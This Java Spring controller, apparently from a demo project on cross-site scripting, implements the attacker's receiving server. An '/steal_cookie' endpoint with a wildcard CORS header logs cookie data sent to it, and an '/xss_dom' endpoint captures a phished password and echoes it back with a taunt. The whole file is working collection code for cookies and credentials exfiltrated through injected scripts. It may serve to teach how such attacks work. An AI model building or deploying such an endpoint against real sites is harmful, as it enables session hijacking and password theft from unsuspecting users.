package com.example.demo.controller;

import java.io.IOException;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class HackerController {
	
	@RequestMapping("/steal_cookie")
	public String stealCookie(HttpServletRequest request, HttpServletResponse response) {
		response.addHeader("Access-Control-Allow-Origin", "*"); 
		System.out.println("Hacker 偷取 cookie: " + request.getParameter("data"));
		return "";
	}
	
	@RequestMapping("/xss_dom")
	public String xssDom(HttpServletRequest request, HttpServletResponse response) throws IOException {
		response.setContentType("text/html;charset=UTF-8");
		response.setCharacterEncoding("UTF-8");
		response.addHeader("Access-Control-Allow-Origin", "*");
		String password = request.getParameter("password");
		if(password  == null ||  password.trim().length() == 0) {
			return "<html><script>history.back();</script></html>";
		}
		String msg = "哈哈！你被騙了，你的密碼是：" + request.getParameter("password");
		return msg;
	}
}
